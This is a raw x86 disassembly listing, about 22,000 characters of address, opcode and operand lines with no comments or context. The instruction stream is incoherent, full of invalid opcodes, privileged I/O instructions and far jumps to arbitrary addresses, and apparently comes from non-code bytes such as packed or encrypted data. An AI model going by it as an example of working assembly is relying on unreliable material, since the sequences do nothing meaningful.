  41d71f:	jmp    0x298419fa
  41d724:	cwde   
  41d725:	inc    ecx
  41d726:	sub    cl,BYTE PTR [edi+0x2a6cdb7e]
  41d72c:	pop    ebx
  41d72d:	sbb    edi,eax
  41d72f:	arpl   WORD PTR [ebx+0x4e4621a0],si
  41d735:	add    ch,BYTE PTR [esi*2+0x5468280c]
  41d73c:	pop    eax
  41d73d:	pop    edx
  41d73e:	lods   al,BYTE PTR ds:[esi]
  41d73f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d740:	push   ebx
  41d741:	pop    ecx
  41d742:	inc    ebp
  41d743:	inc    edx
  41d744:	into   
  41d745:	leave  
  41d746:	das    
  41d747:	int    0xe6
  41d749:	(bad)
  41d74d:	ins    DWORD PTR es:[edi],dx
  41d74e:	sub    eax,0x6c1fcc7e
  41d753:	fild   QWORD PTR [esi]
  41d755:	hlt    
  41d756:	inc    esp
  41d757:	cwde   
  41d758:	into   
  41d759:	sub    dl,BYTE PTR [edi]
  41d75b:	jmp    0x41d71b
  41d75d:	sub    BYTE PTR [ebp+ebx*1-0x1d],0x55
  41d762:	imul   DWORD PTR [eax-0x3ff79295]
  41d768:	mov    eax,ds:0xd69b5fa6
  41d76d:	shl    edx,cl
  41d76f:	jmp    0x651938dd
  41d774:	ror    bl,0x33
  41d777:	loopne 0x41d7cb
  41d779:	stc    
  41d77a:	xor    DWORD PTR [ecx-0x18bb787d],ebp
  41d780:	nop
  41d781:	lds    ebp,FWORD PTR [eax+esi*1-0x41]
  41d785:	adc    eax,0x5ffc9c11
  41d78a:	jmp    0x41d720
  41d78c:	xchg   ecx,eax
  41d78d:	leave  
  41d78e:	ins    DWORD PTR es:[edi],dx
  41d78f:	jecxz  0x41d7ea
  41d791:	ds inc esi
  41d793:	icebp  
  41d794:	in     eax,dx
  41d795:	gs pop ecx
  41d797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d798:	(bad)  
  41d799:	hlt    
  41d79a:	es test al,0x46
  41d79d:	data16 lods al,BYTE PTR ds:[esi]
  41d79f:	sbb    al,cl
  41d7a1:	mov    eax,ds:0x781b56ad
  41d7a6:	test   BYTE PTR [edx+0x71],ch
  41d7a9:	and    BYTE PTR [eax],0x40
  41d7ac:	push   ebp
  41d7ad:	jns    0x41d803
  41d7af:	ficom  DWORD PTR [edi]
  41d7b1:	cmp    eax,0x916aa4
  41d7b6:	pop    edi
  41d7b7:	dec    ecx
  41d7b8:	inc    edx
  41d7b9:	ja     0x41d777
  41d7bb:	jne    0x41d754
  41d7bd:	test   DWORD PTR [edx+0x4c],ebx
  41d7c0:	add    ecx,eax
  41d7c2:	adc    BYTE PTR [eax+0x355bb4b6],dh
  41d7c8:	ss jl  0x41d76f
  41d7cb:	icebp  
  41d7cc:	mov    edx,0x7957726f
  41d7d1:	sti    
  41d7d2:	xchg   esp,eax
  41d7d3:	fsub   DWORD PTR [ebx]
  41d7d5:	fdiv   st,st(2)
  41d7d7:	es retf 0xc331
  41d7db:	add    BYTE PTR ds:0xb2ea4ab3,dh
  41d7e1:	popf   
  41d7e2:	fcom   DWORD PTR [esi-0x73]
  41d7e5:	test   BYTE PTR [ecx-0x5e58128b],ah
  41d7eb:	retf   
  41d7ec:	inc    esi
  41d7ed:	shl    DWORD PTR [esi],0xf8
  41d7f0:	cld    
  41d7f1:	jmp    0x41d860
  41d7f3:	fcmovnu st,st(1)
  41d7f5:	inc    eax
  41d7f6:	push   es
  41d7f7:	imul   esp,DWORD PTR [ecx-0xd],0x4219c918
  41d7fe:	xor    edi,DWORD PTR [ecx-0x43]
  41d801:	dec    ebp
  41d802:	sbb    BYTE PTR [ebx],dl
  41d804:	pop    ebx
  41d805:	adc    eax,0xed762011
  41d80a:	inc    esi
  41d80b:	dec    eax
  41d80c:	mov    bl,0xe4
  41d80e:	sub    dl,al
  41d810:	ficomp WORD PTR [ecx+eiz*2-0x7f2485fc]
  41d817:	and    al,0x50
  41d819:	add    DWORD PTR [ebx+eiz*1],0xb7e5df07
  41d820:	in     eax,0x5a
  41d822:	add    ah,BYTE PTR [edi-0x41]
  41d825:	icebp  
  41d826:	(bad)  
  41d827:	xor    ecx,DWORD PTR [eax+0x2]
  41d82a:	(bad)  
  41d82c:	xor    dl,BYTE PTR [edi+ebp*8-0x7c585881]
  41d833:	ja     0x41d86f
  41d835:	adc    eax,0x686d682e
  41d83a:	pop    ss
  41d83b:	sub    al,0x86
  41d83d:	xor    al,0xad
  41d83f:	nop
  41d840:	add    al,0x85
  41d842:	push   ds
  41d843:	xor    dl,ch
  41d845:	loop   0x41d7db
  41d847:	test   BYTE PTR [esi+edx*8+0x68],ch
  41d84b:	jp     0x41d8a4
  41d84d:	push   cs
  41d84e:	inc    edx
  41d84f:	add    DWORD PTR [esi],0xfffffff8
  41d852:	daa    
  41d853:	or     esi,DWORD PTR [edi]
  41d855:	cmp    cl,BYTE PTR [esi+0x1d67d3b3]
  41d85b:	icebp  
  41d85c:	sub    edx,DWORD PTR [edx]
  41d85e:	je     0x41d85c
  41d860:	cmp    esp,DWORD PTR [edx-0x3e0e69f3]
  41d866:	rol    DWORD PTR [edi-0x6441b5da],1
  41d86c:	aas    
  41d86d:	xchg   ebx,eax
  41d86e:	mov    ebx,0xc76c30eb
  41d873:	jb     0x41d827
  41d875:	sub    esi,DWORD PTR [edx]
  41d877:	aam    0xfd
  41d879:	sub    DWORD PTR [eax+0x22013b2c],esi
  41d87f:	ffreep st(1)
  41d881:	push   eax
  41d882:	js     0x41d824
  41d884:	jge    0x41d8f3
  41d886:	sub    bh,BYTE PTR [edx+0x18]
  41d889:	stos   BYTE PTR es:[edi],al
  41d88a:	loope  0x41d87f
  41d88c:	xchg   BYTE PTR [edi],bh
  41d88e:	(bad)  
  41d88f:	das    
  41d890:	xor    dl,BYTE PTR gs:[esi]
  41d893:	retf   
  41d894:	dec    ecx
  41d895:	dec    BYTE PTR [edx+eax*1-0x4f]
  41d899:	sub    eax,0xf0d9925d
  41d89e:	in     eax,0x2c
  41d8a0:	dec    edi
  41d8a1:	jnp    0x41d8c4
  41d8a3:	fs mov edx,0xe195811c
  41d8a9:	sub    eax,0x5b845821
  41d8ae:	lods   al,BYTE PTR ds:[esi]
  41d8af:	add    BYTE PTR [ebp+0x3],dh
  41d8b2:	fadd   DWORD PTR [ebx+esi*8]
  41d8b5:	out    0x95,eax
  41d8b7:	sub    ecx,DWORD PTR [ecx]
  41d8b9:	retf   0x1397
  41d8bc:	dec    eax
  41d8bd:	daa    
  41d8be:	leave  
  41d8bf:	adc    bh,BYTE PTR es:[eax]
  41d8c2:	mov    ah,0x47
  41d8c4:	lods   al,BYTE PTR ds:[esi]
  41d8c5:	push   cs
  41d8c6:	push   eax
  41d8c7:	outs   dx,DWORD PTR ds:[esi]
  41d8c8:	push   0x84909918
  41d8cd:	pop    ebp
  41d8ce:	cmp    ebp,DWORD PTR [ebx-0x53]
  41d8d1:	jbe    0x41d937
  41d8d3:	cmc    
  41d8d4:	inc    edi
  41d8d5:	or     BYTE PTR [ebp+0x54],ah
  41d8d8:	ds mov ebx,0x48a6dc61
  41d8de:	enter  0x8e27,0xad
  41d8e2:	inc    ebx
  41d8e3:	(bad)  
  41d8e4:	xchg   ecx,eax
  41d8e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8e7:	out    0xf0,al
  41d8e9:	call   0x1542f0bc
  41d8ee:	out    dx,al
  41d8ef:	dec    esi
  41d8f0:	dec    esi
  41d8f1:	enter  0x5e5a,0x4
  41d8f5:	jecxz  0x41d8b0
  41d8f7:	cmp    cl,dl
  41d8f9:	and    bh,BYTE PTR [edi-0x1f]
  41d8fc:	pop    ds
  41d8fd:	sar    DWORD PTR [ecx],cl
  41d8ff:	xor    eax,0x7fd8e2d4
  41d904:	pop    esi
  41d905:	jp     0x41d8b6
  41d907:	(bad)
  41d90c:	mov    bh,0xa1
  41d90e:	(bad)  
  41d90f:	retf   0x3a0b
  41d912:	xor    al,0x5c
  41d914:	retf   
  41d915:	es xor dl,bl
  41d918:	fldcw  WORD PTR [edi]
  41d91a:	inc    esp
  41d91b:	mov    edx,0x1e28c57c
  41d920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d921:	shl    BYTE PTR [esi+esi*8+0x30],cl
  41d925:	sbb    eax,0x7226cf88
  41d92a:	imul   eax,DWORD PTR [esi+0x59],0x3a
  41d92e:	mov    al,0x5b
  41d930:	pushf  
  41d931:	add    bl,cl
  41d933:	and    esp,DWORD PTR [edx+0x1cea5098]
  41d939:	mov    ebp,0xd64a0fe1
  41d93e:	xchg   esi,eax
  41d93f:	mov    ebp,0x1b726745
  41d944:	xor    al,0x63
  41d946:	add    ebx,0x43a9357c
  41d94c:	jmp    0x41d931
  41d94e:	xor    cl,BYTE PTR [eax]
  41d950:	fs aam 0x64
  41d953:	out    0x36,al
  41d955:	cmp    al,0xc9
  41d957:	mov    esp,0x67b3aa3
  41d95c:	mov    WORD PTR [edi],ds
  41d95e:	jmp    0x41d99a
  41d960:	mov    esp,0x7219137
  41d965:	mov    WORD PTR ds:0xc47db1a3,ds
  41d96b:	mov    ch,0x6f
  41d96d:	or     BYTE PTR [ecx-0x7d4ae004],dh
  41d973:	mov    dl,0xdc
  41d975:	test   al,0x8e
  41d977:	mov    dl,0x99
  41d979:	jmp    0x803b:0x62530e67
  41d980:	inc    edx
  41d981:	stos   DWORD PTR es:[edi],eax
  41d982:	push   eax
  41d983:	je     0x41d9cb
  41d985:	retf   0xcd92
  41d988:	sbb    bh,0x3f
  41d98b:	pusha  
  41d98c:	cs test ax,0xe142
  41d991:	rol    BYTE PTR [ebp+0x75664691],cl
  41d997:	cmc    
  41d998:	lahf   
  41d999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d99a:	jo     0x41d9e5
  41d99c:	cmc    
  41d99d:	cmc    
  41d99e:	fmul   DWORD PTR [edx-0x27828236]
  41d9a4:	sbb    bh,bl
  41d9a6:	outs   dx,DWORD PTR ds:[esi]
  41d9a7:	enter  0xa74,0xb8
  41d9ab:	cmp    al,0x6f
  41d9ad:	repnz fs loope 0x41d9f4
  41d9b1:	ss mov al,0x87
  41d9b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9b5:	xchg   esi,eax
  41d9b6:	or     ah,BYTE PTR [esi-0x13af2635]
  41d9bc:	scas   eax,DWORD PTR es:[edi]
  41d9bd:	test   BYTE PTR [eax-0x1dab58a3],bl
  41d9c3:	and    bl,BYTE PTR [ebx+0x77]
  41d9c6:	(bad)  
  41d9c7:	(bad)  
  41d9c8:	mov    ebx,0x98fc7fc5
  41d9cd:	cmp    DWORD PTR [ecx-0xb],eax
  41d9d0:	xchg   ecx,eax
  41d9d1:	js     0x41d99e
  41d9d3:	neg    DWORD PTR [edi+0x3]
  41d9d6:	add    ch,al
  41d9d8:	test   al,0x5
  41d9da:	push   edi
  41d9db:	sub    BYTE PTR [edx-0x77],ah
  41d9de:	rol    DWORD PTR [ebx-0x56e87b3e],1
  41d9e4:	lds    edi,FWORD PTR [edi+0x3a0308fa]
  41d9ea:	rcl    ah,cl
  41d9ec:	pop    esp
  41d9ed:	push   0xe
  41d9ef:	ficomp DWORD PTR [ebp-0x22]
  41d9f2:	sub    al,0x59
  41d9f4:	cwde   
  41d9f5:	push   ebx
  41d9f6:	hlt    
  41d9f7:	ins    DWORD PTR es:[edi],dx
  41d9f8:	add    eax,0x43ecbc3
  41d9fd:	fisubr DWORD PTR [edi]
  41d9ff:	pop    ss
  41da00:	stos   DWORD PTR es:[edi],eax
  41da01:	mov    ebx,0x5b8d4b3f
  41da06:	shl    DWORD PTR [edx+0x2964707e],1
  41da0c:	inc    ecx
  41da0d:	cli    
  41da0e:	or     BYTE PTR [edi],cl
  41da10:	mov    BYTE PTR [edi-0x6],bl
  41da13:	cld    
  41da14:	popa   
  41da15:	mov    al,0x31
  41da17:	mov    DWORD PTR [eax+0x59],ebx
  41da1a:	inc    esi
  41da1b:	mov    esp,0x6ffd3c0a
  41da20:	das    
  41da21:	jl     0x41da53
  41da23:	retf   
  41da24:	ret    0x5ced
  41da27:	aam    0x58
  41da29:	add    DWORD PTR [eax],edi
  41da2b:	mov    cl,0xf8
  41da2d:	xchg   edi,eax
  41da2e:	mov    bl,0xcd
  41da30:	jns    0x41d9c9
  41da32:	mov    ah,0x1e
  41da34:	mov    esp,DWORD PTR ss:[ebx-0x362f3d19]
  41da3b:	out    dx,al
  41da3c:	pop    esi
  41da3d:	mov    ch,0x40
  41da3f:	mov    DWORD PTR [esi-0x4b],esp
  41da42:	fistp  WORD PTR [ecx+0x1d7dd433]
  41da48:	sbb    DWORD PTR [edx+0x28],ecx
  41da4b:	push   ss
  41da4c:	outs   dx,DWORD PTR ds:[esi]
  41da4d:	ret    0x916e
  41da50:	jmp    0xa5d4:0x16dd8791
  41da57:	sar    DWORD PTR [esi],1
  41da59:	rcr    DWORD PTR [ebp+eax*1-0xf],0xd
  41da5e:	adc    DWORD PTR [ebx+eax*4+0x8],0xb374abcf
  41da66:	dec    edx
  41da67:	retf   0x5c42
  41da6a:	xor    BYTE PTR [edi+ebp*1-0x1f],ch
  41da6e:	dec    esp
  41da6f:	imul   ecx,ecx,0xfffffff6
  41da72:	aaa    
  41da73:	mov    BYTE PTR [edi+0x49a67198],ah
  41da79:	push   ebp
  41da7a:	fs xor al,0xec
  41da7d:	push   0xffffffb5
  41da7f:	fcomp  QWORD PTR ds:0x46599736
  41da85:	cld    
  41da86:	push   0x5007c2e2
  41da8b:	xchg   esi,eax
  41da8c:	mov    al,ds:0x4bad1543
  41da91:	pusha  
  41da92:	mov    esi,0x1a210569
  41da97:	(bad)  
  41da98:	fmul   DWORD PTR [eax-0x64a5bd6a]
  41da9e:	sbb    eax,0xd41caaf
  41daa3:	xor    al,BYTE PTR [ebx-0xc7d72f1]
  41daa9:	xor    DWORD PTR [eax+0x716910bc],ecx
  41daaf:	push   edi
  41dab0:	mov    eax,0x62bb2578
  41dab5:	push   ebx
  41dab6:	and    DWORD PTR [edx-0x73],edi
  41dab9:	and    BYTE PTR [ecx],bl
  41dabb:	add    DWORD PTR [eax+ecx*4],ebx
  41dabe:	and    al,0x61
  41dac1:	into   
  41dac2:	push   ss
  41dac3:	pushf  
  41dac4:	pop    ss
  41dac5:	push   ebp
  41dac6:	aaa    
  41dac7:	jmp    0xdc24380b
  41dacc:	int    0x79
  41dace:	into   
  41dacf:	out    0xb0,al
  41dad1:	ret    0x12ae
  41dad4:	loopne 0x41db4f
  41dad6:	and    BYTE PTR [ebp+0x57],0x88
  41dada:	xor    al,0xa5
  41dadc:	cmp    al,0x92
  41dade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dadf:	mov    DWORD PTR [ecx+ebp*4],0xd2ce2ff2
  41dae6:	add    eax,0x190bdfe3
  41daeb:	add    BYTE PTR [ecx-0x6d],bl
  41daee:	push   cs
  41daef:	dec    edx
  41daf0:	inc    edi
  41daf1:	aad    0x6f
  41daf3:	out    0x3c,eax
  41daf5:	fnstsw WORD PTR [eax+eax*1-0x68]
  41daf9:	call   0xdc6a:0xee0ba412
  41db00:	retf   0x9e65
  41db03:	inc    ebp
  41db04:	or     al,0xee
  41db06:	outs   dx,BYTE PTR ds:[esi]
  41db07:	out    0x14,al
  41db09:	gs dec ebp
  41db0b:	xchg   ebx,eax
  41db0c:	imul   esi,DWORD PTR [esi-0x11],0x40ce3d27
  41db13:	push   esp
  41db14:	sbb    dh,bl
  41db16:	sub    BYTE PTR [esi],cl
  41db18:	push   ecx
  41db19:	add    edi,DWORD PTR [eax+0x1ced6ccd]
  41db1f:	(bad)  
  41db21:	pop    edi
  41db22:	mov    eax,ds:0x7b2b68
  41db27:	push   ebp
  41db28:	jbe    0x41db58
  41db2a:	int3   
  41db2b:	repz mov dh,0xc2
  41db2e:	mov    eax,0x97439e6c
  41db33:	out    0x27,eax
  41db35:	call   0xfa9b:0x13ac8a71
  41db3c:	test   al,0xbd
  41db3e:	adc    cl,BYTE PTR [edi+0x365bd0bd]
  41db44:	mov    eax,esp
  41db46:	jle    0x41dbb2
  41db48:	int3   
  41db49:	cwde   
  41db4a:	call   0x33cf:0x6a86d778
  41db51:	enter  0x81c2,0x42
  41db55:	(bad)  
  41db56:	fisttp DWORD PTR [edi+edi*2-0x38a917c2]
  41db5d:	icebp  
  41db5e:	xor    edx,edi
  41db60:	cmp    bh,bl
  41db62:	mov    eax,DWORD PTR [ebx]
  41db64:	mov    ecx,0xa2ec8778
  41db69:	mov    ebx,0x8cf3338f
  41db6e:	jg     0x41dbea
  41db70:	and    eax,0x635a1318
  41db75:	push   ss
  41db76:	mov    edx,0x5661cd8a
  41db7b:	rcr    BYTE PTR [esi+0x43],1
  41db7e:	lds    eax,FWORD PTR [eax-0x3d]
  41db81:	lods   eax,DWORD PTR ds:[esi]
  41db82:	mov    esp,0x5c121b4
  41db87:	ret    0x53be
  41db8a:	test   ebp,edx
  41db8c:	rol    DWORD PTR [eax],0xc4
  41db8f:	push   0x3afe2dcb
  41db94:	jb     0x41db2b
  41db96:	cwde   
  41db97:	add    al,0xd9
  41db99:	cmp    BYTE PTR [edi+0x4ffd40cc],dh
  41db9f:	jg     0x41db5b
  41dba1:	inc    ebx
  41dba2:	call   0xb7dab3cf
  41dba7:	shl    BYTE PTR [edx-0xb7fedc2],cl
  41dbad:	mov    ah,0xf7
  41dbaf:	jge    0x41dbb3
  41dbb1:	fimul  DWORD PTR [ebx-0x7d]
  41dbb4:	outs   dx,DWORD PTR ds:[esi]
  41dbb5:	in     al,0x9
  41dbb7:	gs cs leave 
  41dbba:	pop    ebx
  41dbbb:	inc    eax
  41dbbc:	mov    ds:0xbb010cd4,eax
  41dbc1:	test   BYTE PTR [edi-0x68],0x54
  41dbc5:	inc    ebx
  41dbc6:	xchg   ecx,eax
  41dbc7:	mov    BYTE PTR [ecx-0x7c],bl
  41dbca:	cld    
  41dbcb:	cmp    dl,BYTE PTR [ebx+eiz*1-0xc5cfb69]
  41dbd2:	repnz dec ecx
  41dbd4:	push   eax
  41dbd5:	push   eax
  41dbd6:	add    al,0xf1
  41dbd8:	mov    dl,0x48
  41dbda:	mov    edi,0x26ca2111
  41dbdf:	int3   
  41dbe0:	xchg   BYTE PTR [ebx+eiz*8-0x1588b73e],dh
  41dbe7:	std    
  41dbe8:	push   ebp
  41dbe9:	cmp    edi,esp
  41dbeb:	pop    ebp
  41dbec:	call   0x5bc2a1b5
  41dbf1:	fucomp st(0)
  41dbf3:	jle    0x41dbae
  41dbf5:	inc    esp
  41dbf6:	mov    dh,0x62
  41dbf8:	sub    BYTE PTR [edx-0x6c],0xda
  41dbfc:	lock in eax,0xda
  41dbff:	sbb    cl,dl
  41dc01:	and    eax,0xd48fa070
  41dc06:	sbb    edx,DWORD PTR [edi]
  41dc08:	xor    DWORD PTR [ecx+edi*4],edx
  41dc0b:	fst    DWORD PTR [ebp+ebp*8-0x2f9aec7d]
  41dc12:	add    cl,BYTE PTR [ebx+0x35]
  41dc15:	cmp    DWORD PTR ds:0xe2cc4852,0xffffff99
  41dc1c:	jl     0x41dc64
  41dc1e:	ins    BYTE PTR es:[edi],dx
  41dc1f:	mov    al,0x18
  41dc21:	cmc    
  41dc22:	lahf   
  41dc23:	out    dx,eax
  41dc24:	mov    WORD PTR [eax],es
  41dc26:	jmp    0x9735:0xce2c9bfa
  41dc2d:	inc    eax
  41dc2e:	pop    ebx
  41dc2f:	cli    
  41dc30:	xor    al,0xd2
  41dc32:	ins    DWORD PTR es:[edi],dx
  41dc33:	std    
  41dc34:	int    0x76
  41dc36:	and    ebx,DWORD PTR [ecx+0x5e]
  41dc39:	out    dx,eax
  41dc3a:	imul   ecx,DWORD PTR ds:0xcd6d6e12,0xb3ac98
  41dc44:	cwde   
  41dc45:	das    
  41dc46:	popf   
  41dc47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc48:	sub    BYTE PTR [esp+edx*2-0x2783b21c],dh
  41dc4f:	sti    
  41dc50:	bound  edi,QWORD PTR [ecx+ebp*2-0x49]
  41dc54:	or     BYTE PTR [edx+0x33cccb61],bl
  41dc5a:	push   esi
  41dc5b:	loop   0x41dc0f
  41dc5d:	push   eax
  41dc5e:	retf   0xda1e
  41dc61:	mul    ebx
  41dc63:	fcomp  QWORD PTR [ebx+0x5a4d756e]
  41dc69:	cmp    esp,edx
  41dc6b:	test   al,0x8a
  41dc6d:	cmp    dl,BYTE PTR [edi-0x16]
  41dc70:	cwde   
  41dc71:	mov    al,ds:0x74d2890f
  41dc76:	cmp    bl,BYTE PTR [ebx]
  41dc78:	out    0x76,al
  41dc7a:	leave  
  41dc7b:	out    dx,eax
  41dc7c:	dec    esp
  41dc7d:	leave  
  41dc7e:	mov    edi,0x257e4d32
  41dc83:	adc    esp,DWORD PTR [edx+ebx*1-0x7af98ed8]
  41dc8a:	mov    ah,0x1f
  41dc8c:	fidiv  DWORD PTR ds:0xb34efe27
  41dc92:	popa   
  41dc93:	add    DWORD PTR [ebx+eiz*2+0x57070583],eax
  41dc9a:	jo     0x41dcbf
  41dc9c:	(bad)  
  41dc9d:	clc    
  41dc9e:	dec    eax
  41dc9f:	pop    ss
  41dca0:	xchg   ebx,eax
  41dca1:	xor    esp,esi
  41dca3:	inc    esi
  41dca5:	xor    ebx,DWORD PTR [ecx]
  41dca7:	in     eax,0x74
  41dca9:	and    ebx,DWORD PTR [ebp+ebp*4-0x6c]
  41dcad:	pop    eax
  41dcae:	ins    DWORD PTR es:[edi],dx
  41dcaf:	test   al,0x1a
  41dcb1:	ror    DWORD PTR [esi],0x8e
  41dcb4:	add    BYTE PTR [ecx-0x1c],0xdb
  41dcb8:	aaa    
  41dcb9:	and    DWORD PTR [edi+0x3b91177f],esi
  41dcbf:	mov    ebx,DWORD PTR [edi-0x5d]
  41dcc2:	les    edi,FWORD PTR [eax-0x3c]
  41dcc5:	cmp    esp,DWORD PTR [esp+eax*1]
  41dcc8:	rcr    DWORD PTR fs:[edx+0x16],cl
  41dccc:	jg     0x41dc75
  41dcce:	push   ss
  41dccf:	mov    BYTE PTR [ebx],bh
  41dcd1:	jle    0x41dd4d
  41dcd3:	push   esi
  41dcd4:	dec    ebx
  41dcd5:	cld    
  41dcd6:	jmp    0x51e8:0x8c8308c
  41dcdd:	je     0x41dce9
  41dcdf:	aad    0xee
  41dce1:	mov    esi,0x5c707cc6
  41dce6:	mov    ebp,DWORD PTR [ebx]
  41dce8:	add    cl,al
  41dcea:	add    esi,ebx
  41dcec:	inc    BYTE PTR [edx-0x24]
  41dcef:	or     al,0x29
  41dcf1:	adc    BYTE PTR [ebx],dh
  41dcf3:	dec    esi
  41dcf4:	repz and dh,ah
  41dcf7:	icebp  
  41dcf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcf9:	mov    al,0x4b
  41dcfb:	cmp    BYTE PTR [esi],bl
  41dcfd:	les    esi,FWORD PTR [edi-0x7e]
  41dd00:	cmc    
  41dd01:	cmp    al,0xc2
  41dd03:	into   
  41dd04:	inc    ebx
  41dd05:	popa   
  41dd06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd07:	ds cmp eax,0xb1562395
  41dd0d:	fisub  WORD PTR [ebx+0x7953ff66]
  41dd13:	mov    DWORD PTR [edx+0x79860130],esp
  41dd19:	stc    
  41dd1a:	cmp    bh,BYTE PTR ss:[esi+0x0]
  41dd1e:	clc    
  41dd1f:	pop    ds
  41dd20:	dec    ecx
  41dd21:	push   ss
  41dd22:	test   eax,0xc48a032
  41dd27:	or     esp,ebp
  41dd29:	out    dx,eax
  41dd2a:	fcmovnu st,st(4)
  41dd2c:	ret    0xc636
  41dd2f:	es xbegin 0x57b1574b
  41dd36:	stos   BYTE PTR es:[edi],al
  41dd37:	jge    0x41dd3b
  41dd39:	inc    esp
  41dd3a:	xor    ecx,DWORD PTR [eax]
  41dd3c:	and    ch,BYTE PTR [edi]
  41dd3e:	inc    ebx
  41dd3f:	push   0xffffffc0
  41dd41:	adc    al,0xfd
  41dd43:	fisttp QWORD PTR [esi+0x30]
  41dd46:	mov    cs,WORD PTR [eax]
  41dd48:	mov    ?,WORD PTR [ecx+0x75e44b65]
  41dd4e:	cmp    eax,0x98b8459a
  41dd53:	cmp    BYTE PTR [edx],bl
  41dd55:	outs   dx,BYTE PTR cs:[esi]
  41dd57:	ins    BYTE PTR es:[edi],dx
  41dd58:	mov    ah,ah
  41dd5a:	or     edi,edx
  41dd5c:	xchg   ebx,eax
  41dd5d:	dec    esi
  41dd5e:	loope  0x41dd44
  41dd60:	lods   al,BYTE PTR ds:[esi]
  41dd61:	fild   WORD PTR [ecx+eax*2]
  41dd64:	pop    esi
  41dd65:	sub    ebp,DWORD PTR [edi+0x44]
  41dd68:	mov    ds:0x2c304738,eax
  41dd6d:	or     DWORD PTR [edi-0x20],ecx
  41dd70:	jmp    0x41dddc
  41dd72:	mov    ebx,0x4e6ef2a8
  41dd77:	adc    esi,DWORD PTR [ecx+edi*2+0x5cb3048d]
  41dd7e:	imul   edx,DWORD PTR [ebp-0x61],0x4e4c56b2
  41dd85:	pop    esi
  41dd86:	xor    DWORD PTR [edi],edx
  41dd88:	push   ds
  41dd89:	lock or ah,BYTE PTR [esi-0x40]
  41dd8d:	enter  0x55fd,0xac
  41dd91:	popa   
  41dd92:	xor    esi,eax
  41dd94:	dec    ecx
  41dd95:	stc    
  41dd96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd97:	sub    DWORD PTR [ecx+0x64fd040a],edi
  41dd9d:	ret    0xf07
  41dda0:	in     eax,0xed
  41dda2:	push   ebx
  41dda3:	cmp    cl,al
  41dda5:	sbb    bl,BYTE PTR [edi-0x26]
  41dda8:	sub    al,0xd7
  41ddaa:	sti    
  41ddab:	cmp    eax,0xd88358f4
  41ddb0:	adc    DWORD PTR [edx-0x5f0172bc],esp
  41ddb6:	push   edx
  41ddb7:	sbb    cl,BYTE PTR cs:[eax+0x46]
  41ddbb:	out    dx,eax
  41ddbc:	out    0xf6,al
  41ddbe:	pop    edi
  41ddbf:	mov    edi,0xd39d5142
  41ddc4:	loope  0x41dd52
  41ddc6:	stos   BYTE PTR es:[edi],al
  41ddc7:	xchg   ebp,eax
  41ddc8:	ds js  0x41ddaf
  41ddcb:	mov    dh,0x6d
  41ddcd:	fadd   DWORD PTR [ebp+ebp*8-0x30]
  41ddd1:	sbb    ch,dh
  41ddd3:	and    edi,DWORD PTR [eax+0x4b]
  41ddd6:	fdiv   DWORD PTR [ebx]
  41ddd8:	mov    dl,0x19
  41ddda:	push   es
  41dddb:	xchg   esi,eax
  41dddc:	fcom   DWORD PTR ds:0xaf340866
  41dde2:	sbb    eax,0x7f6af945
  41dde7:	ins    BYTE PTR es:[edi],dx
  41dde8:	es call 0x8f09fc48
  41ddee:	shl    BYTE PTR [esi-0x36],1
  41ddf1:	aam    0xfb
  41ddf3:	mov    BYTE PTR [esp+eiz*4+0x18da68c2],0xda
  41ddfb:	and    BYTE PTR [edi],0x3d
  41ddfe:	aas    
  41ddff:	jg     0x41dde5
  41de01:	and    BYTE PTR [eax+0x36cff674],al
  41de07:	add    edi,DWORD PTR [edi-0x664c2372]
  41de0d:	xor    BYTE PTR [bp+0x2f],bl
  41de11:	xchg   edx,eax
  41de12:	in     al,0x82
  41de14:	jns    0x41dda4
  41de16:	adc    BYTE PTR [edx+0x72],ch
  41de19:	cmp    ebp,DWORD PTR fs:[eax+0x44a4180]
  41de20:	xchg   esp,eax
  41de21:	shr    DWORD PTR [esi],cl
  41de23:	mov    bl,0xfc
  41de25:	(bad)  
  41de26:	xchg   edi,eax
  41de27:	push   ebx
  41de28:	shl    DWORD PTR [esi],0x49
  41de2b:	cmp    al,0x61
  41de2d:	sar    bh,cl
  41de2f:	jno    0x41de17
  41de31:	mov    ch,0x25
  41de33:	xchg   BYTE PTR [edi-0x76],al
  41de36:	das    
  41de37:	sbb    eax,0xb4519a79
  41de3c:	adc    bh,dh
  41de3e:	dec    edx
  41de3f:	lock sub bl,BYTE PTR [edi]
  41de42:	and    BYTE PTR [edx],0x3e
  41de45:	sti    
  41de46:	jo     0x41de7c
  41de48:	mov    BYTE PTR [esi],ch
  41de4a:	push   esi
  41de4b:	inc    eax
  41de4c:	push   ebp
  41de4d:	inc    ebx
  41de4e:	not    BYTE PTR [ebx]
  41de50:	jmp    0xcd01:0xd06e1dfc
  41de57:	outs   dx,DWORD PTR ds:[esi]
  41de58:	and    eax,0x2169573d
  41de5d:	mov    ds:0x2212cf80,eax
  41de62:	dec    ebx
  41de63:	adc    eax,0xc1f0db31
  41de68:	int    0xee
  41de6a:	mov    ?,WORD PTR [edi-0x143b3c03]
  41de70:	push   ds
  41de71:	in     al,0x1c
  41de73:	sbb    BYTE PTR [esi-0x67],dl
  41de76:	pop    edi
  41de77:	adc    BYTE PTR [eax-0x73935de7],0x92
  41de7e:	std    
  41de7f:	aaa    
  41de80:	jb     0x41de61
  41de82:	cmp    dl,BYTE PTR [ebx+eax*1-0x42]
  41de86:	mov    al,0xcc
  41de88:	and    ebp,DWORD PTR [ecx]
  41de8a:	sbb    ebp,DWORD PTR [edx+0x22]
  41de8d:	xchg   esp,eax
  41de8e:	inc    ebp
  41de8f:	leave  
  41de90:	rcl    BYTE PTR [eax+0x26],1
  41de93:	mov    ds:0x6317d36,al
  41de98:	in     eax,0xe5
  41de9a:	aad    0x97
  41de9c:	aaa    
  41de9d:	push   esp
  41de9e:	imul   ecx,DWORD PTR [edi],0xffffffa8
